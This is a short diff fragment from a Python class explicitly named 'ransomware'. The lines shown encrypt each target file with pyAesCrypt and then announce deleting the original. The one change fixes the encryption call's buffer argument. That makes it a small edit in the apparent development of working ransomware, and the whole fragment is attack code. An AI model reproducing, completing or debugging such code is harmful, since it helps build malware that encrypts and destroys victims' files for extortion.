@@ -32,7 +32,7 @@ class ransomware:
             with open(file, 'rb') as ifile:   
                 with open(fileout,'wb') as ofile:
                     print ("Encrypting",file)
-                    cifrando= pyAesCrypt.encryptStream(ifile, ofile, clave, psw)
+                    cifrando= pyAesCrypt.encryptStream(ifile, ofile, clave, buffer)
                     print ("Encrypted successfull")
                     print ("Deleting",file)
         except Exception as e:
